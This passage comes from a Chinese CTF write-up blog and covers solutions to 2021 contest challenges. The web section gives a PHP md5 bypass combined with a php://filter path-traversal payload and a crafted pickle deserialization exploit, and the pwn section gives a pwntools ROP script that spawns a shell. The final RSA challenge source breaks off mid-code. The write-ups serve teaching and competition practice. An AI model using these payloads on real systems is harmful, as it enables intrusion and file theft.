class="comment">#b&#x27;flag&#123;we1c0mE_t0_cr4aK_mE!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;we1c0mE_t0_cr4aK_mE!&#125;</code></p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><blockquote><p>flag{W3Lc0m3_t0_2o2I_3n3rgy_contest}</p></blockquote><p>签到。</p><p><strong>FLAG:</strong> <code>flag&#123;W3Lc0m3_t0_2o2I_3n3rgy_contest&#125;</code></p><p>​    </p><h3 id="hardwire-1"><a href="#hardwire-1" class="headerlink" title="hardwire_1"></a>hardwire_1</h3><blockquote><p>下载附件压缩包，分析文件，找到flag。提交flag格式：flag{xxxx}。</p></blockquote><p>流量包文件，wireshark打开，追踪TCP流，发现菜刀连接流量特征。</p><p>解析流1中<code>z2</code>参数值，base64解码得：</p><p><code>cd /d &quot;C:\php\htdocs&quot;&amp;winrar a -pf@l#ag102 key.rar key.jpg&amp;echo [S]&amp;cd&amp;echo [E]</code></p><p>解析流3中<code>z0</code>参数值，base64解码转存得到Rar文件 <code>key.rar</code>。</p><p>结合前面的解压密码 <code>f@l#ag102</code>，解压得到 flag.jpg。</p><p><strong>FLAG:</strong> <code>flag&#123;579a4da9e3375c9b96add11cf2915eb5&#125;</code></p><p>​    </p><h3 id="wava"><a href="#wava" class="headerlink" title="wava"></a>wava</h3><blockquote><p>Do you know what is wava?</p></blockquote><p>附件move.zip无法打开，010editor查看为wav文件头，修改后缀，使用audacity打开未发现有用信息。</p><p>回到16进制下查看，发现在0x69处存在另一个wav文件头，删除前面的文件头保存，重新使用audacity打开，发现摩斯密码，手撸下来得到：</p><p><code>..-. .-.. .- --. ----- ....- -.. .---- -.. . -.... -.. -.... ...-- .- .- .---- -... ..... -... ..... ..... --... ...-- ..-. -.-. -.... . ----- ---.. . ...-- ----. -.... ..-. -----</code></p><p>解码得flag。</p><p><strong>FLAG:</strong> <code>flag&#123;04d1de6d63aa1b5b5573fc6e08e396f0&#125;</code></p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><blockquote><p>想看二次元有很多障碍(flag在/flag)</p></blockquote><p>点提交按钮出现源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;site&#x27;</span>])&#123; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">想看个二次元怎么这么难</span><br><span class="line">&lt;form action=<span class="string">&#x27;&#x27;</span> method=<span class="string">&#x27;GET&#x27;</span>&gt; </span><br><span class="line">&lt;input type=<span class="string">&#x27;submit&#x27;</span> name=<span class="string">&#x27;submit&#x27;</span> /&gt; </span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;site&#x27;</span> style=<span class="string">&quot;width:1000px&quot;</span> value=<span class="string">&quot;https://bilibili.com/&quot;</span>/&gt; </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]===<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])||(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])!=md5(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))) <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;site&#x27;</span>]; </span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="variable">$url_schema</span> = parse_url(<span class="variable">$url</span>); </span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$url_schema</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line"><span class="variable">$request_url</span> = <span class="variable">$url</span>.<span class="string">&quot;/v/popular/all&quot;</span>.<span class="variable">$path</span>; </span><br><span class="line"><span class="variable">$res</span> = file_get_contents(<span class="variable">$request_url</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strstr(<span class="variable">$res</span>,<span class="string">&quot;flag&quot;</span>)) <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t see my flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res</span>)&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Source Code:&lt;/h1&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$request_url</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;hr /&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$res</span>; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;get source failed&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一层，PHP md5弱比较性质绕过：<code>user[]=1&amp;password[]=2</code></p><p>第二层，PHP伪协议拼接绕过关键词+目录穿越：<code>site=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag</code></p><p>payload:</p><p><code>?submit=%E6%8F%90%E4%BA%A4&amp;site=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag&amp;user[]=1&amp;password[]=2</code></p><p>得到<code>ZmxhZ3tqWkV0NkNrRmNSOFNHbVBCTjJobDVvcjBYVzRUM251TX0K</code>，base64解码得flag。</p><p><strong>FLAG:</strong> <code>flag&#123;jZEt6CkFcR8SGmPBN2hl5or0XW4T3nuM&#125;</code></p><p>​    </p><h3 id="EZpy"><a href="#EZpy" class="headerlink" title="EZpy"></a>EZpy</h3><blockquote><p>pickle反序列化</p></blockquote><p>加参数 <code>?source=1</code> 得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">filename, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, sex, age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.sex = sex</span><br><span class="line">        self.age=age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;people(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.sex!r&#125;</span>, age=<span class="subst">&#123;self.age!r&#125;</span>)&#x27;</span></span><br><span class="line">    <span class="comment">#==判断</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span>  people <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.sex == other.sex <span class="keyword">and</span> self.age==other.age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module[<span class="number">0</span>:<span class="number">8</span>] == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">here_load</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;source&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__),mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;/?source=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/app&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inll</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no no no&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = here_load(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(result) <span class="keyword">is</span> <span class="keyword">not</span> people:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;？？？？&#x27;</span></span><br><span class="line">            correct = (result == people(b.name, b.sex, b.age))</span><br><span class="line">            <span class="keyword">if</span> correct:</span><br><span class="line">                <span class="keyword">return</span> Response(read(<span class="string">&#x27;/flag.txt&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">    test = people(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;55&#x27;</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(test)).decode()</span><br><span class="line">    <span class="keyword">return</span> Response(pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>限制中，改写了<code>find_class</code>函数，只能生成<code>__main__</code>模块的pickle，此外，禁止了<code>b&#39;R&#39;</code>。</p><p>目标是覆盖 <code>b</code> 中的验证，由于 <code>b</code> 被主程序引入，是存在于<code>__main__</code>下的 <code>b</code> 模块中的，所以可以直接覆盖掉，此时就成功绕过了限制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, sex, age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.sex = sex</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;people(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.sex!r&#125;</span>, age=<span class="subst">&#123;self.age!r&#125;</span>)&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span>  people <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.sex == other.sex <span class="keyword">and</span> self.age==other.age</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(pickle.dumps(people(&#x27;aaa&#x27;,&#x27;bbb&#x27;,&#x27;ccc&#x27;)))</span></span><br><span class="line"></span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&quot;aaa&quot;</span></span><br><span class="line"><span class="string">S&quot;sex&quot;</span></span><br><span class="line"><span class="string">S&quot;bbb&quot;</span></span><br><span class="line"><span class="string">S&quot;age&quot;</span></span><br><span class="line"><span class="string">S&quot;ccc&quot;</span></span><br><span class="line"><span class="string">db0(S&quot;aaa&quot;</span></span><br><span class="line"><span class="string">S&quot;bbb&quot;</span></span><br><span class="line"><span class="string">S&quot;ccc&quot;</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">people</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#Y19fbWFpbl9fCmIKKFMnbmFtZScKUyJhYWEiClMic2V4IgpTImJiYiIKUyJhZ2UiClMiY2NjIgpkYjAoUyJhYWEiClMiYmJiIgpTImNjYyIKaV9fbWFpbl9fCnBlb3BsZQou</span></span><br></pre></td></tr></table></figure><p>POST方式在 <code>/app</code> 路由传入参数 <code>data</code>，得到flag。</p><p><strong>FLAG:</strong> <code>flag&#123;2Vl49keFDTMN3frBo6HOYw0djCGzIcPQ&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;能源网络安全是国家实施能源安全战略的重要保障。在国家“碳达峰、碳中和”战略目标引领下，以新能源为主体的新型电力系统正加快建设，能源企业数字化转型加速发展，我国能源网络安全风险挑战仍将持续增大。为深入贯彻习近平总书记关于切实做好国家关键信息基础设施安</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2021羊城杯网络安全大赛</title>
    <link href="https://lazzzaro.github.io/2021/09/12/match-2021%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/09/12/match-2021%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2021-09-11T17:14:50.000Z</published>
    <updated>2021-09-11T19:04:16.364Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、深信服科技股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。</p><p>大赛以“网络安全为人民、网络安全靠人民”为主题，旨在通过竞赛的方式提高参赛选手攻防兼备的网络安全实践技能，实现以赛促学、以赛会友，加强不同院校及单位间的技术交流。</p><p>Rank: 企事业单位组12</p><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Ez-android"><a href="#Ez-android" class="headerlink" title="Ez_android"></a>Ez_android</h3><blockquote><p>Just an easy sign in!</p></blockquote><p>jadx查看<code>MainActivity</code>类。</p><p><code>onClink</code>函数先验证username和password，在资源文件查到username为<code>admin</code>，加密处理后的password值为<code>c232666f1410b3f5010dc51cec341f58</code>，又<code>getEncodeStr</code>函数对password的md5结果每一byte做了减1处理，还原得到<code>c33367701511b4f6020ec61ded352059</code>，查到对应的原值为<code>654321</code>。</p><p>接下来执行<code>getKeyAndRedirect</code>函数，传入password值<code>654321</code>，进入socket交互（<code>nc 139.224.191.201 20080</code>），输入password，拿到key字符串：</p><p>key=<code>TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom</code></p><p>在<code>getKeyAndRedirect</code>函数中最后将key传递到<code>CheckFlagActivity</code>，在<code>CheckFlagActivity</code>中<code>checkFlag</code>函数调用<code>EncodeUtils</code>类实现base64编码，key为码表，encodeFlag为编码结果：</p><p>encodeFlag=<code>3lkHi9iZNK87qw0p6U391t92qlC5rwn5iFqyMFDl1t92qUnL6FQjqln76l-P</code></p><p>跑更换码表base64解码算法还原flag：SangFor{212f4548-03d1-11ec-ab68-00155db3a27e}</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="BabyRop"><a href="#BabyRop" class="headerlink" title="BabyRop"></a>BabyRop</h3><p>有<code>system</code>函数和<code>/cin/sh</code>，简单ROP，缺少的<code>/bin/sh\x00</code>可以用<code>sh\x00</code>代替。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.42.14&#x27;</span>, <span class="number">11000</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./BabyRop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x0804c029</span></span><br><span class="line">system_addr = <span class="number">0x80490a0</span></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x28</span> + <span class="number">4</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(sh_addr)</span><br><span class="line">pause()</span><br><span class="line">sl(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RingRingRing"><a href="#RingRingRing" class="headerlink" title="RingRingRing"></a>RingRingRing</h3><blockquote><p>ring a ring a ring ring a ring a ring</p></blockquote><p>nc测试md5-PoW之后，需要输入100组a,b,c,d,e，使得 $a^4+b^4+c^4+d^4=e^2$，且都不能为0。</p><p>构造 $1^4+1^4+1^4+1^4=2^2$，再按倍数做乘积 $k^4+k^4+k^4+k^4=(2k^2)^2,k \in [1,100]$，得到100组用例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> bruteforce</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span>(<span class="params">prefix,s</span>):</span></span><br><span class="line"><span class="keyword">return</span> bruteforce(<span class="keyword">lambda</span> x:md5(x+prefix).hexdigest()[<span class="number">0</span>:<span class="number">5</span>]==s,string.ascii_letters+string.digits,length=<span class="number">4</span>,method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;192.168.42.14&#x27;</span>,<span class="number">2378</span>)</span><br><span class="line">prefix, s = parse(<span class="string">&quot;Please find a string that md5(str + &#123;&#125;)[0:5] == &#123;&#125;&quot;</span>,r.recvline())</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] Give me xxxxx: &#x27;</span>,brute_force(prefix,s))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] a: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] b: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] c: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] d: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] e: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>*i*i))</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"><span class="comment">#GWHT&#123;a_funny_equation&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Easy-Rsa"><a href="#Easy-Rsa" class="headerlink" title="Easy_Rsa"></a>Easy_Rsa</h3><blockquote><p>你了解RSA吗???</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">nbits, gamma</span>):</span></span><br><span class="line">    g = getPrime(<span class="built_in">int</span>(nbits * gamma))</span><br><span class="line">    alpha = <span class="number">0.5</span> - gamma</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">        p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">            q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            h = <span class="number">2</span> * g * a * b + a + b</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> isPrime(q) <span class="keyword">or</span> isPrime(h) <span class="keyword">or</span> gmpy2.gcd(a, b) != <span class="number">1</span>:</span><br><span class="line">                b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">                q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            